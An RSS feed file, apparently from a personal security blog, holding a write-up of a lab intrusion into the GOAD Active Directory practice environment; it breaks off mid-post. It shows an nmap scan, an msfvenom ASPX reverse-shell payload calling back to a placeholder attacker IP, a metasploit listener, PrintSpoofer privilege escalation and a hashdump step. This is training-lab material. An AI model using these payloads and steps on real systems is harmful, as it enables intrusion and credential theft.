@@ -1,0 +1,1415 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>Write-Ups on Dove</title>
+        <link>http://localhost:1313/categories/write-ups/</link>
+        <description>Recent content in Write-Ups on Dove</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>en</language>
+        <copyright>Kat</copyright>
+        <lastBuildDate>Tue, 21 Jan 2025 00:00:00 +0000</lastBuildDate><atom:link href="http://localhost:1313/categories/write-ups/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>Active Directory Part 2 - Exploring GOAD Environment</title>
+        <link>http://localhost:1313/p/active-directory-part-2-exploring-goad-environment/</link>
+        <pubDate>Tue, 21 Jan 2025 00:00:00 +0000</pubDate>
+        
+        <guid>http://localhost:1313/p/active-directory-part-2-exploring-goad-environment/</guid>
+        <description>&lt;img src="http://localhost:1313/p/active-directory-part-2-exploring-goad-environment/image9.png" alt="Featured image of post Active Directory Part 2 - Exploring GOAD Environment" /&gt;&lt;h2 id=&#34;description&#34;&gt;Description
+&lt;/h2&gt;&lt;p&gt;In this writeup, I&amp;rsquo;m going to be going through my exploitation process with GOAD. This process was through my own investigation. I noticed the Castelblack machine was very insecure. It even had a file upload page when you visited the IP on a browser. I will go into how I exploited this and then gained higher privileges on the machine.&lt;/p&gt;
+&lt;h2 id=&#34;environments-used&#34;&gt;Environments Used
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;GOAD&lt;/li&gt;
+&lt;li&gt;Kali&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;utilities-used&#34;&gt;Utilities Used
+&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;nmap&lt;/li&gt;
+&lt;li&gt;metasploit&lt;/li&gt;
+&lt;li&gt;msfvenom&lt;/li&gt;
+&lt;li&gt;PrinterSpoofer&lt;/li&gt;
+&lt;li&gt;evil-winrm&lt;/li&gt;
+&lt;li&gt;sharphound&lt;/li&gt;
+&lt;li&gt;bloodhound&lt;/li&gt;
+&lt;li&gt;crackmapexec&lt;/li&gt;
+&lt;li&gt;Impacket-GetNPUsers&lt;/li&gt;
+&lt;li&gt;hashcat&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;project-walkthrough&#34;&gt;Project Walkthrough
+&lt;/h2&gt;&lt;h3 id=&#34;reconnaissance&#34;&gt;Reconnaissance
+&lt;/h3&gt;&lt;p&gt;When I first started attacking the environment, I scanned the network with nmap. This gave me an idea of the services I would be encountering.&lt;/p&gt;
+&lt;p&gt;I tried to connect through SMB on all of the machines, but the only one with anything exposed was the Castelblack machine. I figured this was a good starting point. Here is the nmap scan for Castelblack.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;39
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;40
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;41
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;42
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;43
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;44
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;45
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;46
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;47
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;48
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;49
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;50
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;51
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;52
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;53
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;54
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;55
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;56
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;57
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;58
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;59
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;60
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;61
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;62
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;63
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;64
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;65
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;66
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-markdown&#34; data-lang=&#34;markdown&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;PORT     STATE SERVICE       VERSION
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;80/tcp   open  http          Microsoft IIS httpd 10.0
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;|_http-title: Site doesn&amp;#39;t have a title (text/html).
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;|_http-server-header: Microsoft-IIS/10.0
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;| http-methods: 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;|_  Potentially risky methods: TRACE
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;135/tcp  open  msrpc         Microsoft Windows RPC
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;445/tcp  open  microsoft-ds?
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;| Not valid before: 2025-01-20T20:46:29
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;|_Not valid after:  2055-01-20T20:46:29
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;| ms-sql-info: 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;|   192.168.74.22:1433: 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;|     Version: 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;|       name: Microsoft SQL Server 2019 RTM
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;|       number: 15.00.2000.00
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;|       Product: Microsoft SQL Server 2019
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;|       Service pack level: RTM
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;|       Post-SP patches applied: false
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;|_    TCP port: 1433
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;| ms-sql-ntlm-info: 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;|   192.168.74.22:1433: 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;|     Target_Name: NORTH
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;|     NetBIOS_Domain_Name: NORTH
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;|     NetBIOS_Computer_Name: CASTELBLACK
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;|     DNS_Domain_Name: north.sevenkingdoms.local
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;|     DNS_Computer_Name: castelblack.north.sevenkingdoms.local
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;|     DNS_Tree_Name: sevenkingdoms.local
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;|_    Product_Version: 10.0.17763
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;|_ssl-date: 2025-01-20T22:45:06+00:00; 0s from scanner time.
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;3389/tcp open  ms-wbt-server Microsoft Terminal Services
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;| ssl-cert: Subject: commonName=castelblack.north.sevenkingdoms.local
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;| Not valid before: 2025-01-19T20:13:27
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;|_Not valid after:  2025-07-21T20:13:27
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;|_ssl-date: 2025-01-20T22:45:06+00:00; 0s from scanner time.
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;|_http-title: Not Found
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;|_http-server-header: Microsoft-HTTPAPI/2.0
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;5986/tcp open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;|_http-server-header: Microsoft-HTTPAPI/2.0
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;|_ssl-date: 2025-01-20T22:45:06+00:00; 0s from scanner time.
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;|_http-title: Not Found
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;| ssl-cert: Subject: commonName=VAGRANT
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;| Subject Alternative Name: DNS:VAGRANT, DNS:vagrant
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;| Not valid before: 2025-01-19T11:21:16
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;|_Not valid after:  2028-01-19T11:21:16
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;| tls-alpn: 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;|_  http/1.1
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;MAC Address: 00:0C:29:E4:82:DD (VMware)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Device type: general purpose
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Running: Microsoft Windows 2019
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;OS CPE: cpe:/o:microsoft:windows_server_2019
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;OS details: Microsoft Windows Server 2019
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Network Distance: 1 hop
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Host script results:
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;| smb2-security-mode: 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;|   3:1:1: 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;|_    Message signing enabled but not required
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;|_nbstat: NetBIOS name: CASTELBLACK, NetBIOS user: &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;unknown&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;, NetBIOS MAC: 00:0c:29:e4:82:dd (VMware)
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;| smb2-time: 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;|   date: 2025-01-20T22:45:01
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;|_  start_date: N/A
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;The machine seems to have a web page that can be visited, so I went to the IP in my brower.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/active-directory-part-2-exploring-goad-environment/image.png&#34;
+	width=&#34;523&#34;
+	height=&#34;228&#34;
+	srcset=&#34;http://localhost:1313/p/active-directory-part-2-exploring-goad-environment/image_hu3644789445165404818.png 480w, http://localhost:1313/p/active-directory-part-2-exploring-goad-environment/image_hu16964745395945124413.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;showing the landing page of the castelblack website&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;229&#34;
+		data-flex-basis=&#34;550px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;I clicked the link, and there was a file upload tool that told you where the files were being uploaded to. This was a clear way to get shell.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/active-directory-part-2-exploring-goad-environment/image1.png&#34;
+	width=&#34;577&#34;
+	height=&#34;219&#34;
+	srcset=&#34;http://localhost:1313/p/active-directory-part-2-exploring-goad-environment/image1_hu7094727347148938969.png 480w, http://localhost:1313/p/active-directory-part-2-exploring-goad-environment/image1_hu13306337009676980623.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;the upload files page of the castelblack website&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;263&#34;
+		data-flex-basis=&#34;632px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;weaponizing&#34;&gt;Weaponizing
+&lt;/h3&gt;&lt;p&gt;I used msfvenom to craft a .aspx reverse shell. There are a variety of ways this can be done and payloads you can use. Initially, I used just a basic shell and listened for it with netcat. However, metasploit has a multi/handler tool that can be used to spawn meterpreter sessions, which give you a lot more wiggle room.&lt;/p&gt;
+&lt;p&gt;To craft the exploit for this, you need to do the following msfvenom command:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-markdown&#34; data-lang=&#34;markdown&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=&lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;attackerip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt; LPORT=4444 -f aspx -o shell.aspx
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;The port can be whatever you want, and it&amp;rsquo;s typically best to avoid 4444 in a real situation as it is typically quickly picked up since it&amp;rsquo;s the default for metasploit.&lt;/p&gt;
+&lt;p&gt;Now, once you upload the generated payload to the file upload page, you can visit &lt;code&gt;/uploads/shell.aspx&lt;/code&gt; while you have metasploit listening, and you should get a session.&lt;/p&gt;
+&lt;p&gt;Make sure to do the following commands to get metasploit set up to catch the shell:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-markdown&#34; data-lang=&#34;markdown&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msfconsole
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;use multi/handler
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;set payload windows/x64/meterpreter_reverse_tcp
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;set lhost &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;attackerip&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;set lport &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;portyouset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;run
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;exploitation&#34;&gt;Exploitation
+&lt;/h3&gt;&lt;p&gt;Now you can visit the shell uploaded, and a meterpreter session should spawn after a bit.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/active-directory-part-2-exploring-goad-environment/image2.png&#34;
+	width=&#34;871&#34;
+	height=&#34;156&#34;
+	srcset=&#34;http://localhost:1313/p/active-directory-part-2-exploring-goad-environment/image2_hu12764891538223497744.png 480w, http://localhost:1313/p/active-directory-part-2-exploring-goad-environment/image2_hu11282707203168226287.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;the meterpreter shell spawning&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;558&#34;
+		data-flex-basis=&#34;1340px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;The reason I went this route is there is a variety of things you can do with a meterpreter shell. Specifically, it makes it much easier to upload and download files. You can also spawn into a normal shell this way and then back out of it to use meterpreter commands.&lt;/p&gt;
+&lt;p&gt;From here there are a variety of routes you can take. First, it&amp;rsquo;s best to elevate privileges. If you check the user you spawn as and their privileges, you will see an interesting one:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/active-directory-part-2-exploring-goad-environment/image3.png&#34;
+	width=&#34;747&#34;
+	height=&#34;355&#34;
+	srcset=&#34;http://localhost:1313/p/active-directory-part-2-exploring-goad-environment/image3_hu14934653119392812267.png 480w, http://localhost:1313/p/active-directory-part-2-exploring-goad-environment/image3_hu10955280322680254665.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;whoami command and whoami /priv command results&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;210&#34;
+		data-flex-basis=&#34;505px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;You&amp;rsquo;ll see that you have the SeImpersonatePrivilege enabled. The two attacks that can exploit this are the JuicyPotato and &lt;a class=&#34;link&#34; href=&#34;https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;PrinterSpoofer&lt;/a&gt; attacks.The JuicyPotato attack won&amp;rsquo;t work with this machine as it&amp;rsquo;s a Windows Server 2019 machine, so I went with PrinterSpoofer.&lt;/p&gt;
+&lt;p&gt;You can do this manually by uploading the PrinterSpoofer64.exe to the box and running the following command:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-markdown&#34; data-lang=&#34;markdown&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;PrintSpoofer.exe -i -c cmd
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;This should spawn an elevated shell.&lt;/p&gt;
+&lt;p&gt;With meterpreter, all you need to do is go back into the meterpreter shell and type &lt;code&gt;getsystem&lt;/code&gt; and it will elevate you to nt authority.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;http://localhost:1313/p/active-directory-part-2-exploring-goad-environment/image4.png&#34;
+	width=&#34;672&#34;
+	height=&#34;284&#34;
+	srcset=&#34;http://localhost:1313/p/active-directory-part-2-exploring-goad-environment/image4_hu9971879519910405219.png 480w, http://localhost:1313/p/active-directory-part-2-exploring-goad-environment/image4_hu17037212203224852074.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+		alt=&#34;using meterpreter to gain elevated privileges&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;236&#34;
+		data-flex-basis=&#34;567px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;From here, you should be able to just type &lt;code&gt;hashdump&lt;/code&gt; into the meterpreter window, and all the user hashes should drop:&lt;/p&gt;
